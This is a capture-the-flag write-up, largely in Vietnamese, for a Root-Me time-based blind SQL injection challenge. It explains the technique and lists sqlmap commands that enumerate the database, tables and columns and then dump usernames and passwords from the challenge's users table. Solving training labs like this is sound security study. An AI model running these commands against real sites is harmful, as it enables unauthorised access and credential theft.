# SQL injection - Time based 

Point: 45

Be patient

Statement: Retrieve administrator’s password.

Related ressource: [Time-Based Blind SQL Injection using Heavy Queries](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Time%20based%20blind%20SQL%20Injection%20using%20heavy%20queries.pdf?_gl=1*31a6v3*_ga*MTE0NDg5MTA5LjE2Nzk2MzIzMDY.*_ga_SRYSKX09J7*MTY4Mjc0Nzk4OC44MS4xLjE2ODI3NDgwMjAuMC4wLjA.)

# Overview:

Time based SQL injection-là 1 kiểu tấn công blind SQL thường được dùng khi không còn cách nào khác để khai thác cơ sở dữ liệu.Kĩ thuật này gửi 1 truy vấn đến cơ sở dữ liệu, buộc cơ sở dữ liệu phải đợi 1 khoảng thời gian trước khi phản hồi. Và dựa vào thời gian phản hồi ấy hacker có thể xác định được truy vấn đưa ra là đúng hay sai. Thông thường là kiểm tra thứ tự từng kí tự của bảng hay của cột từ đó đạt được tên bảng tên cột và cả data.

Form của challenge

![image](https://user-images.githubusercontent.com/115911041/235286776-993a4abe-07ac-4f5a-b039-5538fd5e6b36.png)

Có 2 phần chính là `Login` và `Member list`. Bài này mình giải bằng 2 cách SQL map và code python.

# Solution:

## SQLmap

Khi ta chuyển sang phần `member` và chọn `admin` thì URL có thay đổi, nên ta có thể khai thác từ tham số đó

`python3 sqlmap.py -u "http://challenge01.root-me.org/web-serveur/ch40/?action=member&member=1" --time-sec=3 --dbs`

![image](https://user-images.githubusercontent.com/115911041/235287468-b2ba4c20-07b0-4fff-ae10-adf0d4f50df2.png)

Kết quả cho ra database `public`.Tiếp tục truy cập vào `public`.

`python3 sqlmap.py -u "http://challenge01.root-me.org/web-serveur/ch40/?action=member&member=1 --time-sec=3 -D public --tables`

![image](https://user-images.githubusercontent.com/115911041/235288969-3bf14840-e3a8-4e22-a377-6564d30394e2.png)

Ra kết quả có tables `users`. Tiếp tục vào table `users`

`python3 sqlmap.py -u "http://challenge01.root-me.org/web-serveur/ch40/?action=member&member=1" --time-sec=3 -D public -T users --columns`

![image](https://user-images.githubusercontent.com/115911041/235289845-443aaeab-772f-44a8-8c43-d0676bb7a7aa.png)

Bước cuối chỉ cần lấy data các column nữa là xong

`python3 sqlmap -u "http://challenge01.root-me.org/web-serveur/ch40/?action=member&member=1" --time-sec=10 -D public -T users -C id,email,usermame,password --dump`


